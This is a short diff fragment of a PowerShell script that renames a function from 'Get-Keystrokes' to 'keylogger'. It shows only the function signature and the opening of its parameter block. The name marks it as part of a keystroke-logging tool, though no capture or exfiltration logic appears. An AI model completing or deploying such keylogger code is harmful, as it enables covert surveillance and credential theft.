@@ -1,4 +1,4 @@
-function Get-Keystrokes {
+function keylogger {
     [CmdletBinding()] 
     Param (
         [Parameter(Position = 0)]
